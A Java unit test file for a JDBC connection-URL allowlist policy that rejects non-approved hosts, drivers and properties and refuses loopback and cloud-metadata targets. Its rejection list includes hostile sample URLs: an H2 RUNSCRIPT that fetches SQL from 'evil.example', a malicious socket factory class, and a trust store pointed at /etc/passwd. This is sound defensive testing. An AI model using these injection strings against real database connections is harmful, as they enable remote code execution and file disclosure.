package com.prototype.vulnwatch.service;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.net.InetAddress;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class SccmJdbcPolicyTest {

    private static final Map<String, byte[]> DNS = Map.of(
            "sccm.corp.example", new byte[]{10, 1, 2, 3},
            "loopback.example", new byte[]{127, 0, 0, 1},
            "metadata.example", new byte[]{(byte) 169, (byte) 254, (byte) 169, (byte) 254});

    private final SccmJdbcPolicy policy = new SccmJdbcPolicy(
            "sccm.corp.example, loopback.example;metadata.example", host -> {
                try {
                    return new InetAddress[]{InetAddress.getByAddress(host, DNS.get(host))};
                } catch (Exception ex) {
                    throw new IllegalArgumentException(ex);
                }
            });

    @Test
    void acceptsAnApprovedHostWithTheDocumentedProperties() {
        var parsed = policy.validate(
                " jdbc:sqlserver://SCCM.corp.example:1444;databaseName=CM_P01;encrypt=true;trustServerCertificate=true ");

        assertEquals("sccm.corp.example", parsed.host());
        assertEquals(1444, parsed.port());
        assertEquals("CM_P01", parsed.database());
        assertTrue(parsed.url().startsWith("jdbc:sqlserver://SCCM"));
    }

    @Test
    void defaultsToThePlainSqlServerPort() {
        assertEquals(1433, policy.validate("jdbc:sqlserver://sccm.corp.example;databaseName=CM_P01").port());
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://sccm.corp.example/db",
            "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil.example/x.sql'",
            "jdbc:sqlserver://other.example",
            "jdbc:sqlserver://sccm.corp.example\\INSTANCE",
            "jdbc:sqlserver://sccm.corp.example:0",
            "jdbc:sqlserver://sccm.corp.example:70000",
            "jdbc:sqlserver://user:pw@sccm.corp.example",
            "jdbc:sqlserver://sccm.corp.example/../x",
            "jdbc:sqlserver://sccm.corp.example;user=sa;password=secret",
            "jdbc:sqlserver://sccm.corp.example;integratedSecurity=true",
            "jdbc:sqlserver://sccm.corp.example;authentication=ActiveDirectoryPassword",
            "jdbc:sqlserver://sccm.corp.example;socketFactoryClass=evil.Factory",
            "jdbc:sqlserver://sccm.corp.example;trustStore=/etc/passwd",
            "jdbc:sqlserver://sccm.corp.example;databaseName=a;databaseName=b",
            "jdbc:sqlserver://sccm.corp.example;trustServerCertificate=maybe",
            "jdbc:sqlserver://sccm.corp.example;loginTimeout=9999",
            "jdbc:sqlserver://sccm.corp.example;databaseName=CM P01"
    })
    void rejectsEverythingOutsideTheApprovedShape(String url) {
        assertThrows(IllegalArgumentException.class, () -> policy.validate(url));
    }

    @Test
    void anEmptyAllowlistApprovesNothing() {
        SccmJdbcPolicy closed = new SccmJdbcPolicy("", host -> new InetAddress[0]);

        assertThrows(IllegalArgumentException.class, () -> closed.validate("jdbc:sqlserver://sccm.corp.example"));
    }

    @Test
    void errorMessagesDoNotEchoRejectedPropertyValues() {
        var error = assertThrows(IllegalArgumentException.class,
                () -> policy.validate("jdbc:sqlserver://sccm.corp.example;password=hunter2"));

        assertTrue(!error.getMessage().contains("hunter2"));
    }

    @Test
    void privateAddressesAreAllowedButLoopbackAndMetadataAreNot() {
        policy.assertSafeTarget("sccm.corp.example");
        assertThrows(IllegalArgumentException.class, () -> policy.assertSafeTarget("loopback.example"));
        assertThrows(IllegalArgumentException.class, () -> policy.assertSafeTarget("metadata.example"));
    }
}
